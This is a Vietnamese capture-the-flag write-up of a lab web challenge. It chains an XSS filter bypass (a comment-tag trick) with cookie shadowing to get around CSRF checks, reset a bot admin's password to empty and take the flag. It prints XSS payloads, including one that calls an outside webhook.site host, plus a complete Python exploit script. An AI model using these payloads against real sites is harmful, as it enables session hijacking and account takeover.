## ChatGPT Made Me Do It
Nhìn vào dockerfile và docker-compose thì khả năng là 1 bài XSS vì thấy có tải `chromium`.
Nhận thấy XSS xảy ra ở username khi đăng kí tài khoản.Có một bộ lọc yếu để chặn XSS.
```javascript
function santi(str) {
  const tag = str.match(/<([^>]*)>/); // .match chỉ kiếm tra match 1 lần , vì không dùng cờ g

  if (tag && /[a-zA-Z]/.test(tag[1])) {
    return 'no hack';
  }

  return str;
}
```
bộ lọc lấy match trong cặp`<>` chỉ 1 lần (thiếu cờ g).
bypass: `<!---><script>alert(1)</script>`
![image](https://hackmd.io/_uploads/H1BFMpVKfg.png)
XSS dính ở endpoint `/immortal-gate/check`

```javascript
router.all('/immortal-gate/check', (req, res) => {
  const name = req.query.name || req.session.username || '';
  res.write(`${santi(decodeURIComponent(String(name)))}, hello`);
  res.end();
});

```

function gửi url cho bot:

```javascript
router.all('/immortal-gate/report', (req, res) => {
  const username = req.session.username;

  if (username === undefined) return res.redirect('/immortal-gate/sign-in');

  if (req.method === 'GET') return res.send(renderReport());

  const url = req.body.url || '';
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    return res.send(alertBack('❌ Liên kết định dạng sai, phải bắt đầu bằng http:// hoặc https://!'));
  }

  visitUrl(url).catch((error) => {
    console.error(`Error occurred: ${error && error.stack ? error.stack : error}`);
  });
```

ở app.js hoặc nhìn cấu hình ở trình duyệt có cấu hình `httpOnly` nên không đọc được cookies. Nhưng cứ tạo request ra webhook để check trước đã. 
![image](https://hackmd.io/_uploads/HyexYETEYzx.png)
![image](https://hackmd.io/_uploads/r182E6EFzl.png)

`res.write()` đơn giải chỉ trả về 1 văn bản (text) không xét content-type nên cần sử dụng signature của file html để trình duyệt tự nhận diện


thêm đoạn code sau để chek rõ log:
```
await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 5000 });
	// check url
    const currentUrl = page.url();
    console.log("--- URL THỰC TẾ TRANG ĐANG TRUY CẬP ---");
    console.log(currentUrl);
    
    // check response 
    
    const pageContent = await page.content();
    
    console.log("--- NỘI DUNG HTML TRẢ VỀ TỪ URL ---");
    console.log(pageContent);
    // [THÊM ĐOẠN NÀY] Kiểm tra cách trình duyệt đánh giá nội dung
    const evaluationResult = await page.evaluate(() => {
      const docType = document.contentType; // Kiểu MIME mà trình duyệt thực tế đang gán cho trang
      const hasHtmlStructure = document.querySelector('html') !== null; // Kiểm tra xem có nhận diện ra thẻ html hay không
      const firstChildTag = document.body ? document.body.firstElementChild?.tagName : null;

      return {
        browserContentType: docType,
        hasHtmlTag: hasHtmlStructure,
        firstTag: firstChildTag,
        pageTextLength: document.body ? document.body.innerText.length : 0
      };
    });
    
    console.log("--- ĐÁNH GIÁ CỦA TRÌNH DUYỆT ---");
    console.log(evaluationResult);
```
payload: `http://localhost:3000/immortal-gate/check?name=<!---><script>new Image().src = "https://webhook.site/61b6dfc5-fe15-4492-8437-e04e7d5b367a/?msg=qdz";</script>`
![image](https://hackmd.io/_uploads/ryXefA4Kzx.png)
![image](https://hackmd.io/_uploads/H1cbfREtMe.png)


nhận thấy thành công nhưng mà `httpOnly` không đọc được nên cần check function khác: reset password. 
[Cookie Shadowing](https://kalawy.medium.com/cookie-shadowing-and-csp-bypass-to-read-httponly-cookie-way-too-easy-conctf-finals-0de7dda28ee6)

```javascript
router.all('/cultivation/password', (req, res) => {
  const username = req.session?.username;
  const csrfToken = req.cookies.csrf_token;

  if (username === undefined) {
    return res.redirect('/immortal-gate/sign-in');
  } 

  if (req.headers['x-csrf-token'] !== csrfToken) {
    return res.send(alertBack('❌ Tâm ma tác sai, công kích bị ngăn chặn!'));
  }

  const newPassword = req.body.new_password || '';
  users.set(username, newPassword);

  return res.send(alertBack('✨ Công pháp tu sửa thành công!'));
});
```

Từ trình duyệt admin ---> reset passowrd nhưng cần `x-csrf-token'] == csrfToken`

```
Same-name Cookies ordering
When the browser encounters multiple cookies with the same name destined for the same endpoint, how will it order those cookies in the Cookie? Will it send the early created first?
Actually, RFC 6265 §5.4 states that ordering goes as follows:

1. The cookie with the longest path comes first.
2. If two cookies have the same path length, the earliest created one comes first.
```

Theo như câu nói trên thì nếu same-name cookies thì nó ưu tiên path dài hơn . ----> từ XSS tạo 1 cookies name trùng với path khác nhau.
Cấu hình `middleware`
```javascript
const { alertBack } = require('./utils');
const { BASE_URL } = require('./config');

function csrfProtection(req, res, next) {
  const secFetchSite = req.get('Sec-Fetch-Site');
  const secFetchUser = req.get('Sec-Fetch-User');
  const method = req.method;

  if (method === 'GET') {
    return next();
  }

  if (secFetchSite !== undefined && secFetchUser !== '?1') {
    return res.send(alertBack('no hack'));
  }

  return next();

}

module.exports = {
  csrfProtection,
};

```

nếu method là Get thì sẽ không dính , `ecFetchUser` sẽ không được tự động tạo bởi các request bởi `fetch()` , `new Image().src` ,....

**script:**
```javascript
<!---><script>
void (async () => {
   document.cookie = 'csrf_token=quandz; path=/cultivation/password; SameSite=Strict';
   await fetch('/cultivation/password', {
    method: 'GET',
    headers: {
      'x-csrf-token': 'quandz'
    },
    credentials: 'include' 
  });
})();

</script>
```
sử dụng url này : 
```
http://localhost:3000/immortal-gate/check?name=<!---><script>
void(async()=>{document.cookie='csrf_token=quandz; path=/cultivation/password; SameSite=Strict';await fetch('/cultivation/password',{method:'GET',headers:{'x-csrf-token':'quandz'},credentials:'include'});})();
</script>
```
để thay đổi password của admin thành rỗng rồi login lấy flag `username=admin&password=` sau đó truy cập `/immortal-gate/treasure` bằng POST method để lấy flag



![image](https://hackmd.io/_uploads/HJz_hyStfe.png)

Script tự động:
```bash
#!/usr/bin/env python3
import http.cookiejar, random, re, string, sys, time, urllib.parse, urllib.request

HOST = (sys.argv[1] if len(sys.argv) > 1 else "<http://localhost:3000>").rstrip("/")
BOT = "<http://localhost:3000>"
XSS = """<!--><script>void(async()=>{document.cookie='csrf_token=knowncsrf; path=/cultivation/password; SameSite=Strict';await fetch('/cultivation/password',{method:'GET',headers:{'x-csrf-token':'knowncsrf'},credentials:'include'})})();</script>"""
PAY = BOT + "/immortal-gate/check?name=" + urllib.parse.quote(XSS, safe="")
FLAG = re.compile(r"\w+\{[^}]+\}")

def sess():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def req(op, path, data=None):
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    return op.open(urllib.request.Request(HOST + path, data=data, method="GET" if data is None else "POST"), timeout=10).read().decode(errors="replace")

s = "".join(random.choices(string.digits, k=10))
u, p = "u" + s, "p" + s
a = sess()
req(a, "/immortal-gate/sign-up", {"username": u, "password": p})
req(a, "/immortal-gate/sign-in", {"username": u, "password": p})
req(a, "/immortal-gate/report", {"url": PAY})
time.sleep(3)
a = sess()
req(a, "/immortal-gate/sign-in", {"username": "admin", "password": ""})
print(FLAG.search(req(a, "/immortal-gate/treasure", b"")).group())

```